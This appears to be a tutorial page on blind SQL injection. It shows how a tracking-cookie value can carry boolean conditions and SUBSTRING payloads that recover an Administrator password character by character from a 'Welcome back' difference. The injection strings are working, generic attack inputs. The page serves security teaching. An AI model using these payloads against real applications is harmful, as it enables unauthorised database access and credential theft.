## What is Blind SQL Injection?

Blind SQLi is when the application is vulnerable but HTTP responses don't return query results or error details — making UNION attacks ineffective since there's nothing to read back.

## Exploiting via Conditional Responses

Consider a tracking cookie processed like this:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

The app shows a **"Welcome back"** message if the query returns results — nothing otherwise. That single boolean difference is enough to extract data.

Injecting two conditions back to back:

```sql
xyz' AND '1'='1   ← true  → "Welcome back" shown
xyz' AND '1'='2   ← false → "Welcome back" gone
```

This lets you ask yes/no questions against the database and infer data one bit at a time.

## Extracting Data Character by Character

To brute-force the `Administrator` password, test one character at a time using `SUBSTRING`:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

- "Welcome back" shown → first char is **after** `m` in the alphabet

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

- No "Welcome back" → first char is **not after** `t`

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

- "Welcome back" shown → first char is **`s`** ✓

Repeat for each character position until the full password is recovered.

<Warning>
  `SUBSTRING` is called `SUBSTR` on some databases — check the SQL injection cheat sheet.
